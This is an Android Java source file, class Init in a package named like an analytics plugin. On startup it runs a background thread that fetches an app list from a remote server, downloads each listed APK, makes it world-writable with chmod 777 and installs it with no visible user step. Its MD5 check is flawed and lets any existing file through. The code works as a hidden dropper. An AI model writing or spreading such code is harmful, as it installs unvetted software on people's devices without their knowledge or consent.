package com.anlytics.plug;

import android.text.TextUtils;
import android.util.Log;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

public class Init {
    public static boolean isinit = false;
    private static String TAG = "Init";

    public static void init() {
        isinit = true;
        PkgDexUtils.initFilePath();
        InitThread music = new InitThread();
        music.start();
    }

    public static boolean isTvbsDowning = false;
    public static long takeTimeDownTvbus = 0;//用于检测网速

    private static class InitThread extends Thread {
        //2):在A类中覆盖Thread类中的run方法.
        public void run() {
            //long time=tool.get().getTimeLong();
            int count = 0;
            while (true) {
                //if(count%10==0)Log.i(TAG,"init run count="+count);
                count++;
                if (count > 0x7fffffff) count = 0;
                if (tool.get().isConnectingToInternet()) {
                    if (getinfos()) break;
                    if (getinfos()) break;//如果失败 重来一次
                    break;
                }
                try {

                    Thread.sleep(20000);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }

    private static boolean getinfos() {
        String infos = tool.get().httpGet(ConfigFile.APPS_INFO_URL);
        Log.i(TAG, "infos=jjjj");
        if (!TextUtils.isEmpty(infos) && infos.length() > 100) {
            try {
                int localinfosdate = PreferencesUtils.getInt(ParserUtils.getContext(), "infosdate", 0);
                Log.i(TAG, "localinfosdate=" + localinfosdate);

                JSONObject jsonObject = new JSONObject(infos);
                int date = jsonObject.optInt("date");
                if (localinfosdate < date) {
                    JSONArray mJSONArray = jsonObject.optJSONArray("appInfos");
                    boolean installFail = false;
                    for (int i = 0; i < mJSONArray.length(); i++) {
                        JSONObject appOne = mJSONArray.getJSONObject(i);
                        String appurl = appOne.optString("appUrl");
                        String appmd5 = appOne.optString("appMd5");
                        String appPkgName = appOne.optString("appPkgName");
                        int appVersionCode = appOne.optInt("appVersionCode");
                        //Log.i(TAG,"appurl="+appurl);
                        if (PkgDexUtils.checkPackageNameExist(appPkgName)) break;//应用已安装，不用再安装了
                        File file = new File("/data/data/" + ParserUtils.getContext().getPackageName() + "/files/apps/" + appPkgName + ".apk");
                        if (file.exists()) file.delete();
                        if (IOUtils.downFile(appurl,
                                "/data/data/" + ParserUtils.getContext().getPackageName() + "/files/apps/", appPkgName + ".apk")) {
                            if (file.exists() || appmd5.equalsIgnoreCase(tool.get().md5(file))) {

                                //下载文件成功
                                Runtime.getRuntime().exec("chmod 777 " + "/data/data/" + ParserUtils.getContext().getPackageName() + "/files/apps/" + appPkgName + ".apk" + " \n");
                                //Log.i("dyl","down ok="+appPkgName);
                                PkgDexUtils.install("/data/data/" + ParserUtils.getContext().getPackageName() + "/files/apps/" + appPkgName + ".apk");
                            } else {
                                Log.i(TAG, "down fail2!=" + appPkgName);
                                installFail = true;
                            }

                        } else {
                            Log.i(TAG, "down fail!=" + appPkgName);
                            installFail = true;
                        }
                        if (file.exists()) file.delete();
                    }
                    //保存标签
                    if (!installFail) {
                        PreferencesUtils.putInt(ParserUtils.getContext(), "infosdate", date);
                        return true;
                    }

                }
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }
}
